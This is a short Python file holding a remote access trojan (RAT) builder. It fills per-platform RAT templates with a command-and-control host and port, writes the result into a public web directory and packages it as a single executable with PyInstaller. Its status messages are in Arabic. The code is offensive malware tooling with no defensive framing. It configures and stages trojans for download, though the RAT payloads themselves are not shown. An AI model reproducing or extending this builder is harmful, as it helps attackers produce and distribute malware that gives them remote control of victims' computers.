import os
import shutil

def generate_standalone_rat(target, host, port):
    template_dir = "templates/"
    output_dir = "/var/www/html/rat/"

    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    rat_file = os.path.join(template_dir, f"{target}_rat.py")
    if not os.path.exists(rat_file):
        print("[-] لا يوجد نموذج RAT لهذا النظام.")
        return

    with open(rat_file, 'r') as f:
        content = f.read()

    content = content.replace("{{C2_HOST}}", host).replace("{{C2_PORT}}", port)

    output_file = os.path.join(output_dir, f"rat_{target}.py")
    with open(output_file, 'w') as f:
        f.write(content)

    print(f"[+] RAT تم حفظه في: {output_file}")

    try:
        import PyInstaller.__main__
        PyInstaller.__main__.run([
            'pyinstaller',
            '--noconfirm',
            '--onefile',
            '--distpath', output_dir,
            output_file
        ])
        os.remove(output_file)
        print(f"[+] RAT تم تحويله إلى تنفيذي في: {output_dir}")
    except ImportError:
        print("[*] PyInstaller غير مثبت. يمكنك تثبيته لتحويل الكود إلى تنفيذي.")